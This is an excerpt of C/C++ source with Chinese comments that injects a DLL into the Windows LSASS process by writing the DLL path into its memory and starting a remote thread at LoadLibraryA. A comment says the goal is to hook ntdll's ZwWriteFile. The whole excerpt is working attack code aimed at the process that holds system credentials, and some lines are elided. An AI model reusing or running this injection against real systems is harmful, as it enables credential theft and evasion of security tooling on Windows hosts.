...
int main(int argc, char** argv)
{
	...
	exit(-1);
	// 先尝试注入dll hook住ntdll的zwwritefile函数
	HANDLE hProcess= hLsass;
	void* baseaddress = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (baseaddress == nullptr) {
		printf("virtualloc failed, error code: %x\n", GetLastError());
		exit(-1);
	}
	printf("rempote address %p\n", baseaddress);
	// 写入远程进程的内存
	char pathdll[123] = "C:\\Users\\Administrator\\Desktop\\autoCompletion\\1\\Dll1.dll";
	if (!WriteProcessMemory(hProcess, baseaddress, (void*)pathdll, strlen(pathdll), NULL)) {

		printf("WriteProcessMemory failed, error code: %x\n", GetLastError());
		exit(-1);
	}
	// 然后使用createremotethread来在远程进程中创建一个线程，但是创建线程是需要一个
	 // routine的地址的，因此我们需要先获取到LoadLibraryA函数的地址
	HMODULE hKernel32 = GetModuleHandleA("Kernel32");
	if (hKernel32 == NULL) {
		VirtualFreeEx(hProcess, baseaddress, 0x0, MEM_RELEASE);
		baseaddress = nullptr;

		CloseHandle(hProcess);
		hProcess = NULL;

		printf("GetModuleHandleA failed, error code: %x\n", GetLastError());
		exit(-1);
		return 0x0;
	}
	void* pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
	if (pLoadLibraryA == nullptr) {
		printf("Get loadlibraryA ProcAddress failed, error code: %x\n", GetLastError());
		exit(-1);
	}
	printf("pLoadLibraryA  address %p\n", pLoadLibraryA);
	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryA, baseaddress, NULL, nullptr);
	if (hThread == NULL) {
		VirtualFreeEx(hProcess, baseaddress, 0x0, MEM_RELEASE);
		baseaddress = nullptr;
		...
		printf("CreateRemoteThread failed, error code: %x\n", GetLastError());
		exit(-1);
		return 0x0;
	}

	printf("dll injected and fired up\n");
